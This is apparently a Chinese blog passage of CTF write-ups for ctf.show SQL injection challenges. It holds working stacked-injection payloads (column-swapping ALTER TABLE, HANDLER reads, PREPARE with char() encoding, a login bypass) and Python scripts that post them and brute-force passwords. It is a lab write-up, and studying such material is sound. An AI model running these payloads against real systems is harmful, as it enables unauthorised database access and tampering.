<h2 id="196（没营养的题）"><a href="#196（没营养的题）" class="headerlink" title="196（没营养的题）"></a>196（没营养的题）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不能超过16个字符&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>个人感觉这题TNND弱智，也许是想给我们说，限制16字符以下且无select时进行注入是不可能的吧</p>
<p>本题过滤的是 se1ect 而不是 select（明明正则里面写的就是select，出题人非要说是se1ect就这样吧），故直接使用select即可</p>
<p><strong>payload：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;select(1)</span><br></pre></td></tr></table></figure></div>

<p>空格和*被过滤了，就这样写了，利用堆叠注入绕过密码</p>
<h2 id="197-198（未禁；和alter）"><a href="#197-198（未禁；和alter）" class="headerlink" title="197-198（未禁；和alter）"></a>197-198（未禁；和alter）</h2><p><strong>堆叠注入alter互换id和password进行爆破查找</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>有过滤的数字型注入，没有过滤分号可堆叠注入。没有禁用 <code>空格 alter table change column</code>，id 相比 password 具有<font color=deeppink>递增</font>规律更容易爆破，实现互换 id 和 password。然后username是0或者0x61646d696e，password从1开始爆破即可。(可以使用bp或者自己写脚本)。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220818171119466.png"
                      alt="image-20220818171119466"
                ></p>
<p><strong>（当年学习 mysql 的笔记）</strong></p>
<p><strong>（在我脚本运行的时候，还必须在 change 后面加上 column ，不然执行不了，可能是mysql版本问题吧）</strong></p>
<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a><strong>payload</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `pass` `koishi` <span class="type">varchar</span>(<span class="number">255</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `id` `pass` <span class="type">varchar</span>(<span class="number">255</span>);<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `koishi` `id` <span class="type">varchar</span>(<span class="number">255</span>);</span><br></pre></td></tr></table></figure></div>



<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><strong>exp</strong></h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b531b46e-ea66-48f5-8745-92d056f5b6e7.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alter_tableColumn</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ten sa yi Cirno : watashi wa shiyou shi hajime ta   *(੭*ˊᵕˋ)੭* \n&quot;</span>)</span><br><span class="line">    change_payload = <span class="string">&#x27;0;alter table ctfshow_user change column `pass` `koishi` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `koishi` `id` varchar(255);&#x27;</span></span><br><span class="line">    <span class="comment"># 将密码字段（pass）修改为任意的字符串，如何将id字段名修改为pass，这样sql语句查询时，就查找的是原来的id序列了，账号可以使用0绕过(也可以是admin)(十进制或者十六进制都行)，密码用数字爆破即可</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: change_payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_flag = <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foreach_num</span>():</span><br><span class="line">    max_num = <span class="number">300</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;now, Cirno is working to solve the password:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_num):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r now password is <span class="subst">&#123;i&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Yo katta !! CirnoChan get the response :\n <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == max_num - <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nSorry, maybe the max_num is a little smaller&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alter_tableColumn()</span><br><span class="line">    foreach_num()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<h2 id="199-200（还是；和alter，稍加修改）"><a href="#199-200（还是；和alter，稍加修改）" class="headerlink" title="199-200（还是；和alter，稍加修改）"></a>199-200（还是；和alter，稍加修改）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>有过滤的数字型注入，没有过滤分号可堆叠注入。</strong><br><strong>正则禁用username的括号，password 改用 text 类型，id 改用 int 类型</strong></p>
<p><strong>本质上还是和上一题一样，不过是需要修改一下类型（嘛，毕竟没禁掉；和alter）</strong></p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `pass` `koishi` text;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `id` `pass` <span class="type">int</span>;<span class="keyword">alter</span> <span class="keyword">table</span> ctfshow_user change <span class="keyword">column</span> `koishi` `id` text;</span><br></pre></td></tr></table></figure></div>



<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35154a42-0d8a-4494-82e3-47db74fdd560.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alter_tableColumn</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ten sa yi Cirno : watashi wa shiyou shi hajime ta   *(੭*ˊᵕˋ)੭* \n&quot;</span>)</span><br><span class="line">    change_payload = <span class="string">&#x27;0;alter table ctfshow_user change column `pass` `koishi` text;alter table ctfshow_user change column `id` `pass` int;alter table ctfshow_user change column `koishi` `id` text;&#x27;</span></span><br><span class="line">    <span class="comment"># 将密码字段（pass）修改为任意的字符串，如何将id字段名修改为pass，这样sql语句查询时，就查找的是原来的id序列了，账号可以使用0绕过(也可以是admin)(十进制或者十六进制都行)，密码用数字爆破即可</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: change_payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_flag = <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foreach_num</span>():</span><br><span class="line">    max_num = <span class="number">300</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;now, Cirno is working to solve the password:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_num):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r now password is <span class="subst">&#123;i&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Yo katta !! CirnoChan get the response :\n <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == max_num - <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nSorry, maybe the max_num is a little smaller&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alter_tableColumn()</span><br><span class="line">    foreach_num()</span><br></pre></td></tr></table></figure></div>







<h2 id="225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理"><a href="#225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理" class="headerlink" title="225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理"></a>225（堆叠注入plus，多限制，禁update、alter）–学习handler和预处理</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>select 和union 被禁了，我们就思考使用堆叠注入（；分号没禁），但是update和alter被禁了，我们之前的使用就不行了，我们就要想想其他的办法了</strong></p>
<h3 id="解法1–handler"><a href="#解法1–handler" class="headerlink" title="解法1–handler"></a>解法1–handler</h3><p><strong>学习handler的语法和使用</strong></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/JesseYoung/article/details/40785137" >(37条消息) mysql查询语句-handler_jesseyoung的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 声明句柄</span><br><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"> </span><br><span class="line"># 句柄操作</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name READ &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"># 关闭句柄</span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure></div>



<p><strong>1）先使用万能密码看看都有什么数据（不看也行&#x3D;。&#x3D;，下面的username写1也可以）</strong></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=1&#x27; or 1=&#x27;1</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825112735610.png"
                      alt="image-20220825112735610"
                ></p>
<p><strong>2）因为没禁show，配合堆叠注入看看有哪些表名</strong></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=ctfshow&#x27;;show tables;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825113203126.png"
                      alt="image-20220825113203126"
                ></p>
<p>看到可疑表名ctfshow_flagasa，尝试查看</p>
<p><strong>3）因为无select，使用handler</strong></p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=ctfshow&#x27;;handler ctfshow_flagasa open as t;handler t read first;handler t close’</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825113630972.png"
                      alt="image-20220825113630972"
                ></p>
<p><strong>完事</strong></p>
<h3 id="解法2–预处理"><a href="#解法2–预处理" class="headerlink" title="解法2–预处理"></a>解法2–预处理</h3><p>学习预处理知识</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html" >MySQL的SQL预处理(Prepared) - GeaoZhang - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义预处理语句</span><br><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line"># 执行预处理语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> <span class="variable">@var_name</span> [, <span class="variable">@var_name</span>] ...];</span><br><span class="line"># 删除(释放)定义</span><br><span class="line">&#123;<span class="keyword">DEALLOCATE</span> <span class="operator">|</span> <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name;</span><br></pre></td></tr></table></figure></div>



<p><strong>自己写了个脚本，当然手动注入也行&#x3D;。&#x3D;</strong></p>
<p>（因为ban了很多关键字，这种可以使用char 或者 concat 绕过）</p>
<p>下面脚本是char 写法（写了脚本，比较方便，不用像concat那样手动分开）</p>
<p>concat大致是：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>user1<span class="string">&#x27;;PREPARE koishi from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> database()<span class="string">&#x27;);EXECUTE koishi; </span></span><br></pre></td></tr></table></figure></div>

<p>database前面或者select后面记得加空格&#x3D;。&#x3D;</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c1bfa393-c96f-41c7-b316-f0dfacba54d4.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_maker</span>(<span class="params">sql:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;ctfshow&#x27;;prepare koishi from char(<span class="subst">&#123;<span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> sql)&#125;</span>);execute koishi;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:payload_maker(<span class="string">&quot;show tables&quot;</span>)</span><br><span class="line">        <span class="comment"># show tables</span></span><br><span class="line">        <span class="comment"># select * from ctfshow_flagasa</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,params=params)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>





<p><strong>1） show tables</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825121029602.png"
                      alt="image-20220825121029602"
                ></p>
<p><strong>2）select * from ctfshow_flagasa</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220825121135839.png"
                      alt="image-20220825121135839"
                ></p>
<p><strong>这道题又学废新姿势了 ：）</strong></p>
<h2 id="226、228-230（堆叠注入plus，再增限制）"><a href="#226、228-230（堆叠注入plus，再增限制）" class="headerlink" title="226、228-230（堆叠注入plus，再增限制）"></a>226、228-230（堆叠注入plus，再增限制）</h2><p><strong>先看题限制</strong></p>
<p>226</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>228-230</p>
<p>有过滤的堆叠注入，这次把禁用的字符放进了表里，测试发现 226 的 payload 还能用，依旧能用，我们就着重分析226即可。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说内容太多，就写入数据库保存</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$banlist</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$banlist</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$char</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 